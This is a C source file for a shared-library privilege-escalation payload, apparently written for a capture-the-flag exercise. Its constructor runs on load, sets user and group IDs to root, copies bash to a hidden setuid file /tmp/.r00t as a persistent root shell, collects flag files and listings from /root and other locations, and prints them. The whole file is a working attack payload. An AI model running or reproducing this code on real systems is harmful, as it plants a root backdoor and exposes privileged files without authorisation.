#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
	setuid(0); seteuid(0); setgid(0); setegid(0);
	/* Make a root shell and dump everything useful into /tmp/flag_out */
	system("cp /bin/bash /tmp/.r00t 2>/dev/null; chmod 4755 /tmp/.r00t 2>/dev/null; "
	       "rm -f /tmp/flag_out; "
	       "for f in /root/root.txt /root/flag.txt /root/.flag /root/flag /flag /flag.txt "
	       "          /opt/flag /opt/flag.txt /root/user.txt /root/root /var/lib/acme/root.txt; do "
	       "  if [ -f \"$f\" ]; then echo \"== $f ==\" >> /tmp/flag_out; cat \"$f\" >> /tmp/flag_out 2>&1; fi; "
	       "done; "
	       "echo '== ls -la /root ==' >> /tmp/flag_out; ls -la /root >> /tmp/flag_out 2>&1; "
	       "echo '== ls -laR /var/lib/acme ==' >> /tmp/flag_out; ls -laR /var/lib/acme >> /tmp/flag_out 2>&1; "
	       "echo '== find root flags ==' >> /tmp/flag_out; "
	       "find / -xdev -type f \\( -iname '*flag*' -o -iname '*root*' \\) 2>/dev/null | head -50 >> /tmp/flag_out; "
	       "id >> /tmp/flag_out 2>&1; chmod 666 /tmp/flag_out 2>/dev/null");
	execl("/bin/sh","sh","-c","id; echo '--- flag ---'; cat /tmp/flag_out 2>/dev/null",NULL);
}